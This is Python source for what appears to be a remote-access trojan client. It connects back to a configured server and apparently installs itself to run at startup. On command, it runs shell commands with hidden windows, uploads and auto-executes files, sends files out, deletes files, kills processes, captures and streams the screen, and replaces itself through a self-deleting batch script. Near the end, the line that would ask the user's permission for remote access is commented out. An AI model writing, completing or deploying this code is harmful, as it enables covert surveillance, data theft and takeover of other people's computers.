def connect():
    ensure_startup()
    delay_index = 0
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((SERVER_IP, SERVER_PORT))
            delay_index = 0
            send_all(sock, json.dumps(get_info()).encode())
            
            current_dir = os.path.expanduser("~")
            streaming_active = threading.Event()
            recv_buffer = b""
            current_upload = None
            restart_requested = False
            sock_lock = threading.Lock()

            def _run_cmd(_sock, _lock, _cmd, _timeout, _cwd):
                try:
                    if sys.platform == "win32":
                        try:
                            _cmd = os.path.expandvars(_cmd)
                        except (ValueError, os.error):
                            pass
                        flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                        result = subprocess.run(["cmd.exe", "/c", _cmd], capture_output=True, timeout=_timeout, cwd=_cwd, creationflags=flags)
                    else:
                        result = subprocess.run(_cmd, shell=True, capture_output=True, timeout=_timeout, cwd=_cwd)
                    out = result.stdout.decode("cp437", errors="replace") if result.stdout else ""
                    err = result.stderr.decode("cp437", errors="replace") if result.stderr else ""
                    if not out and not err and result.returncode == 0:
                        out = "\n[Command executed successfully]\n"
                    send_all(_sock, json.dumps({"action": "cmd_output", "output": out, "error": err}).encode(), _lock)
                except subprocess.TimeoutExpired:
                    send_all(_sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Command timeout ({_timeout} seconds)"}).encode(), _lock)
                except Exception as e:
                    send_all(_sock, json.dumps({"action": "cmd_output", "output": "", "error": str(e)}).encode(), _lock)

            while True:
                try:
                    chunk = sock.recv(256 * 1024)
                    if not chunk:
                        break
                except socket.timeout:
                    continue
                recv_buffer += chunk
                if len(recv_buffer) > 10 * 1024 * 1024:
                    recv_buffer = b""
                decoder = json.JSONDecoder()
                while True:
                    try:
                        first = recv_buffer.find(b"{")
                        if first == -1:
                            break
                        obj, pos = decoder.raw_decode(recv_buffer[first:].decode("utf-8", errors="surrogateescape"))
                        command = obj
                        recv_buffer = recv_buffer[first + pos:]
                    except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
                        break
                    
                    try:
                        if command["action"] == "ping":
                            send_all(sock, json.dumps({"action": "pong"}).encode(), sock_lock)
                        elif command["action"] == "upload_file":
                            if command.get("execute", False):
                                target_dir = command.get("path") or os.environ.get("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
                            else:
                                target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
                            target_dir = os.path.abspath(os.path.expanduser(target_dir))
                            filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
                            try:
                                os.makedirs(target_dir, exist_ok=True)
                                file_data = base64.b64decode(command["data"])
                                with open(filepath, "wb") as f:
                                    f.write(file_data)
                                if command.get("execute", False):
                                    try:
                                        if sys.platform == "win32":
                                            os.startfile(filepath)
                                        else:
                                            subprocess.Popen([filepath], shell=True)
                                        send_all(sock, json.dumps({"action": "execute_result", "error": ""}).encode(), sock_lock)
                                    except Exception as ex:
                                        send_all(sock, json.dumps({"action": "execute_result", "error": str(ex)}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "file_error", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "upload_start":
                            if current_upload:
                                try:
                                    current_upload["f"].close()
                                except Exception:
                                    pass
                            if command.get("execute", False):
                                target_dir = command.get("path") or os.environ.get("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
                            else:
                                target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
                            target_dir = os.path.abspath(os.path.expanduser(target_dir))
                            filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
                            try:
                                os.makedirs(target_dir, exist_ok=True)
                                f = open(filepath, "wb")
                                current_upload = {"f": f, "path": filepath, "total": command.get("total", 0), "received": 0, "execute": command.get("execute", False)}
                                send_all(sock, json.dumps({"action": "upload_chunk_ack"}).encode(), sock_lock)
                            except Exception as e:
                                current_upload = None
                                send_all(sock, json.dumps({"action": "file_error", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "upload_chunk":
                            if current_upload:
                                try:
                                    data = base64.b64decode(command["data"])
                                    current_upload["f"].write(data)
                                    current_upload["received"] += len(data)
                                    send_all(sock, json.dumps({"action": "upload_progress", "received": current_upload["received"], "total": current_upload["total"]}).encode(), sock_lock)
                                except Exception as e:
                                    send_all(sock, json.dumps({"action": "file_error", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "upload_end":
                            if current_upload:
                                try:
                                    current_upload["f"].close()
                                    if current_upload.get("execute", False):
                                        try:
                                            if sys.platform == "win32":
                                                os.startfile(current_upload["path"])
                                            else:
                                                subprocess.Popen([current_upload["path"]], shell=True)
                                            send_all(sock, json.dumps({"action": "execute_result", "error": ""}).encode(), sock_lock)
                                        except Exception as ex:
                                            send_all(sock, json.dumps({"action": "execute_result", "error": str(ex)}).encode(), sock_lock)
                                    else:
                                        send_all(sock, json.dumps({"action": "upload_done", "error": ""}).encode(), sock_lock)
                                except Exception as e:
                                    send_all(sock, json.dumps({"action": "upload_done", "error": str(e)}).encode(), sock_lock)
                                current_upload = None
                        
                        elif command["action"] == "list_dir":
                            path = command.get("path", os.path.expanduser("~"))
                            path = os.path.abspath(os.path.expanduser(path))
                            if not _is_safe_path(path):
                                send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Access denied: unsafe path"}).encode(), sock_lock)
                                continue
                            try:
                                if not os.path.isdir(path):
                                    send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Not a directory"}).encode(), sock_lock)
                                else:
                                    entries = []
                                    for name in os.listdir(path):
                                        if name.startswith('.') or name.startswith('$'):
                                            continue
                                        full = os.path.join(path, name)
                                        try:
                                            is_dir = os.path.isdir(full)
                                            size = os.path.getsize(full) if not is_dir else 0
                                            entries.append({"name": name, "is_dir": is_dir, "size": size})
                                        except OSError:
                                            entries.append({"name": name, "is_dir": False, "size": -1})
                                    send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": entries, "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "list_drives":
                            try:
                                drives = []
                                if sys.platform == "win32":
                                    import string
                                    from ctypes import windll
                                    bitmask = windll.kernel32.GetLogicalDrives()
                                    for letter in string.ascii_uppercase:
                                        if bitmask & 1:
                                            root = f"{letter}:/"
                                            drives.append({"name": root, "is_dir": True, "size": 0})
                                        bitmask >>= 1
                                else:
                                    drives.append({"name": "/", "is_dir": True, "size": 0})
                                send_all(sock, json.dumps({"action": "list_dir_result", "path": None, "entries": drives, "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "list_dir_result", "path": None, "entries": [], "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "get_file":
                            path = command.get("path", "")
                            path = os.path.abspath(os.path.expanduser(path))
                            if not _is_safe_path(path) or not _is_safe_file(path):
                                send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Access denied: unsafe file"}).encode(), sock_lock)
                                continue
                            try:
                                if not os.path.isfile(path):
                                    send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode(), sock_lock)
                                else:
                                    total_size = os.path.getsize(path)
                                    filename = os.path.basename(path)
                                    if total_size > CHUNK_THRESHOLD:
                                        send_all(sock, json.dumps({"action": "get_file_start", "filename": filename, "size": total_size, "error": ""}).encode(), sock_lock)
                                        with open(path, "rb") as f:
                                            idx = 0
                                            while True:
                                                chunk = f.read(CHUNK_SIZE)
                                                if not chunk:
                                                    break
                                                send_all(sock, json.dumps({"action": "get_file_chunk", "index": idx, "data": base64.b64encode(chunk).decode()}).encode(), sock_lock)
                                                idx += 1
                                        send_all(sock, json.dumps({"action": "get_file_end", "error": ""}).encode(), sock_lock)
                                    else:
                                        with open(path, "rb") as f:
                                            data = base64.b64encode(f.read()).decode()
                                        send_all(sock, json.dumps({"action": "file_data", "path": path, "filename": filename, "data": data, "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "create_folder":
                            path = command.get("path", "")
                            path = os.path.abspath(os.path.expanduser(path))
                            try:
                                os.makedirs(path, exist_ok=True)
                                send_all(sock, json.dumps({"action": "create_folder_result", "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "create_folder_result", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "delete_path":
                            path = command.get("path", "")
                            path = os.path.abspath(os.path.expanduser(path))
                            try:
                                if os.path.isfile(path):
                                    os.remove(path)
                                elif os.path.isdir(path):
                                    import shutil
                                    shutil.rmtree(path)
                                else:
                                    send_all(sock, json.dumps({"action": "delete_path_result", "error": "Not found"}).encode(), sock_lock)
                                    continue
                                send_all(sock, json.dumps({"action": "delete_path_result", "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "delete_path_result", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "rename_path":
                            old = command.get("old", "")
                            new = command.get("new", "")
                            old = os.path.abspath(os.path.expanduser(old))
                            new = os.path.abspath(os.path.expanduser(new))
                            try:
                                os.rename(old, new)
                                send_all(sock, json.dumps({"action": "rename_path_result", "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "rename_path_result", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "get_process_list":
                            try:
                                import csv
                                r = subprocess.run(
                                    ["tasklist", "/fo", "csv", "/nh"],
                                    capture_output=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                                )
                                processes = []
                                stdout = r.stdout.decode("cp437", errors="replace") if r.stdout else ""
                                if stdout.strip():
                                    for row in csv.reader(stdout.strip().splitlines()):
                                        if len(row) >= 2:
                                            name, pid = row[0].strip('"'), row[1].strip('"')
                                            try:
                                                int(pid)
                                                processes.append({"pid": pid, "name": name})
                                            except ValueError:
                                                pass
                                send_all(sock, json.dumps({"action": "process_list", "processes": processes, "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "process_list", "processes": [], "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "kill_process":
                            pid = command.get("pid")
                            try:
                                pid = int(pid)
                                if sys.platform == "win32":
                                    subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
                                else:
                                    os.kill(pid, 9)
                                send_all(sock, json.dumps({"action": "kill_process_result", "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "kill_process_result", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "screenshot":
                            try:
                                screenshot = ImageGrab.grab()
                                img_buffer = io.BytesIO()
                                screenshot.save(img_buffer, format='PNG')
                                img_data = base64.b64encode(img_buffer.getvalue()).decode()
                                response = {
                                    "action": "screenshot_data",
                                    "image": img_data,
                                    "width": screenshot.width,
                                    "height": screenshot.height
                                }
                                send_all(sock, json.dumps(response).encode(), sock_lock)
                            except Exception as e:
                                response = {"action": "screenshot_error", "error": f"Screenshot failed: {str(e)}"}
                                send_all(sock, json.dumps(response).encode(), sock_lock)
                        
                        elif command["action"] == "start_screen":
                            streaming_active.clear()
                            streaming_active.set()
                            selected_quality = command.get("quality", "medium")
                            def stream_screen(quality):
                                try:
                                    if quality == "low":
                                        quality_param = (800, 600)
                                        jpeg_quality = 70
                                        fps_delay = 0.05
                                    elif quality == "high":
                                        quality_param = (1920, 1080)
                                        jpeg_quality = 95
                                        fps_delay = 0.033
                                    else:
                                        quality_param = (1280, 720)
                                        jpeg_quality = 85
                                        fps_delay = 0.05
                                    while streaming_active.is_set():
                                        try:
                                            start_time = time.time()
                                            screenshot = ImageGrab.grab()
                                            if quality != "high":
                                                screenshot = screenshot.resize(quality_param, Image.Resampling.BILINEAR)
                                            img_buffer = io.BytesIO()
                                            screenshot.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
                                            img_data = base64.b64encode(img_buffer.getvalue()).decode()
                                            response = {
                                                "action": "screen_data",
                                                "image": img_data,
                                                "width": screenshot.width,
                                                "height": screenshot.height
                                            }
                                            send_all(sock, json.dumps(response).encode(), sock_lock)
                                            elapsed = time.time() - start_time
                                            sleep_time = max(0, fps_delay - elapsed)
                                            time.sleep(sleep_time)
                                        except Exception as e:
                                            if streaming_active.is_set():
                                                try:
                                                    send_all(sock, json.dumps({"action": "screen_error", "error": str(e)}).encode(), sock_lock)
                                                except Exception:
                                                    pass
                                            break
                                except Exception as e:
                                    try:
                                        send_all(sock, json.dumps({"action": "screen_error", "error": str(e)}).encode(), sock_lock)
                                    except Exception:
                                        pass
                            streaming_thread = threading.Thread(target=stream_screen, args=(selected_quality,), daemon=True)
                            streaming_thread.start()
                        
                        elif command["action"] == "stop_screen":
                            streaming_active.clear()
                        
                        elif command["action"] == "update_client":
                            try:
                                file_data = base64.b64decode(command.get("data", ""))
                                filename = command.get("filename", "update.exe")
                                
                                current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
                                current_dir = os.path.dirname(current_exe)
                                
                                new_exe_path = os.path.join(current_dir, "update_temp_" + filename)
                                
                                old_exe_to_delete = None
                                if current_exe.lower().endswith('.py'):
                                    old_exe_to_delete = current_exe
                                    current_exe = current_exe[:-3] + '.pyw'
                                    
                                bat_path = os.path.join(current_dir, "update.bat")
                                
                                with open(new_exe_path, "wb") as f:
                                    f.write(file_data)
                                
                                is_script = not getattr(sys, 'frozen', False)
                                interpreter = sys.executable
                                
                                if is_script:
                                    if interpreter.lower().endswith('python.exe'):
                                        alt_interpreter = interpreter[:-10] + 'pythonw.exe'
                                        if os.path.exists(alt_interpreter):
                                            interpreter = alt_interpreter
                                    run_command = f'start "" "{interpreter}" "{current_exe}"'
                                else:
                                    run_command = f'start "" "{current_exe}"'

                                bat_content = f"""@echo off
ping 127.0.0.1 -n 3 > nul
"""
                                if old_exe_to_delete:
                                    bat_content += f'del "{old_exe_to_delete}"\n'
                                    
                                bat_content += f"""del "{current_exe}"
if exist "{current_exe}" goto :retry
move "{new_exe_path}" "{current_exe}"
{run_command}
del "%~f0"
exit
:retry
ping 127.0.0.1 -n 2 > nul
del "{current_exe}"
if not exist "{current_exe}" (
    move "{new_exe_path}" "{current_exe}"
    {run_command}
    del "%~f0"
    exit
) else (
    goto :retry
)
"""
                                with open(bat_path, "w") as f:
                                    f.write(bat_content)
                                
                                try:
                                    send_all(sock, json.dumps({"action": "cmd_output", "output": "Update received. Restarting to apply update...\n", "error": ""}).encode(), sock_lock)
                                except Exception:
                                    pass
                                    
                                if sys.platform == "win32":
                                    subprocess.Popen(["cmd.exe", "/c", bat_path], creationflags=0x08000000)
                                else:
                                    subprocess.Popen(["sh", "-c", f"sleep 2; rm '{current_exe}'; mv '{new_exe_path}' '{current_exe}'; '{current_exe}' &"])
                                
                                try:
                                    sock.close()
                                except Exception:
                                    pass
                                sys.exit(0)
                                
                            except Exception as e:
                                try:
                                    send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Update failed: {str(e)}"}).encode(), sock_lock)
                                except Exception:
                                    pass
                                    
                        elif command["action"] == "restart_client":
                            try:
                                send_all(sock, json.dumps({"action": "cmd_output", "output": "Restarting client...\n", "error": ""}).encode(), sock_lock)
                            except Exception:
                                pass
                            try:
                                sock.close()
                            except Exception:
                                pass
                            restart_requested = True
                            break
                        
                        elif command["action"] == "execute_file":
                            path = command.get("path", "")
                            path = os.path.abspath(os.path.expanduser(path))
                            try:
                                if not os.path.isfile(path):
                                    send_all(sock, json.dumps({"action": "execute_result", "error": "Not a file or not found"}).encode(), sock_lock)
                                else:
                                    if sys.platform == "win32":
                                        os.startfile(path)
                                    else:
                                        subprocess.Popen([path], shell=True)
                                    send_all(sock, json.dumps({"action": "execute_result", "error": ""}).encode(), sock_lock)
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "execute_result", "error": str(e)}).encode(), sock_lock)
                        
                        elif command["action"] == "execute_cmd":
                            cmd_to_execute = command["command"].strip()
                            cmd_timeout = command.get("timeout", 300)
                            if not _is_safe_command(cmd_to_execute):
                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons"}).encode(), sock_lock)
                                continue
                            try:
                                lower = cmd_to_execute.lower().strip()
                                if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd..") or "cd /d" in lower:
                                    target = None
                                    if lower == "cd" or lower == "cd~":
                                        target = os.path.expanduser("~")
                                    elif lower == "cd.." or lower == "cd ..":
                                        target = os.path.abspath(os.path.join(current_dir, ".."))
                                    elif lower.startswith("cd.."):
                                        target = os.path.abspath(os.path.join(current_dir, ".."))
                                    elif "/d" in lower:
                                        parts = cmd_to_execute[2:].strip().lstrip("/\\").strip().split(None, 1)
                                        if parts:
                                            drive = (parts[0] or "").rstrip(":")
                                            if drive and len(drive) == 1:
                                                target = os.path.abspath(drive + ":\\")
                                                if len(parts) > 1:
                                                    rest = parts[1].strip().strip('"\'')
                                                    target = os.path.abspath(os.path.join(target, rest))
                                            else:
                                                target = None
                                        else:
                                            target = None
                                    else:
                                        path = cmd_to_execute[3:].strip()
                                        if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
                                            path = path[1:-1]
                                        try:
                                            path = os.path.expandvars(path)
                                        except (ValueError, os.error):
                                            pass
                                        path = os.path.expanduser(path)
                                        target = path if os.path.isabs(path) else os.path.abspath(os.path.join(current_dir, path))
                                    if target and os.path.isdir(target):
                                        current_dir = target
                                        response = {"action": "cmd_output", "output": current_dir + "\n", "error": ""}
                                    else:
                                        response = {"action": "cmd_output", "output": "", "error": "The system cannot find the path specified."}
                                    send_all(sock, json.dumps(response).encode(), sock_lock)
                                    continue
                                _interactive_cmds = {"cmd", "cmd.exe", "python", "python.exe", "python3", "pwsh", "pwsh.exe", "powershell", "powershell.exe"}
                                _first_word = cmd_to_execute.strip().split()[0].lower() if cmd_to_execute.strip() else ""
                                if _first_word in _interactive_cmds and len(cmd_to_execute.strip().split()) == 1:
                                    send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Cannot run '{_first_word}' in remote shell - it starts an interactive session that never exits. The shell already runs under cmd.exe /c."}).encode(), sock_lock)
                                    continue
                                # Run in thread so main loop stays responsive (ping, etc.)
                                threading.Thread(target=_run_cmd, args=(sock, sock_lock, cmd_to_execute, cmd_timeout, current_dir), daemon=True).start()
                            except Exception as e:
                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Internal error: {str(e)}"}).encode(), sock_lock)
                    except Exception as e:
                        try:
                            send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Internal error: {str(e)}"}).encode(), sock_lock)
                        except Exception:
                            pass
            if restart_requested:
                delay_index = 0
                continue  # immediate reconnect without backoff
        except Exception as e:
            delay = RECONNECT_DELAYS[min(delay_index, len(RECONNECT_DELAYS) - 1)]
            time.sleep(delay)
            delay_index += 1

if __name__ == "__main__":
    if already_running():
        sys.exit(0)
    #if not request_remote_access_permission():
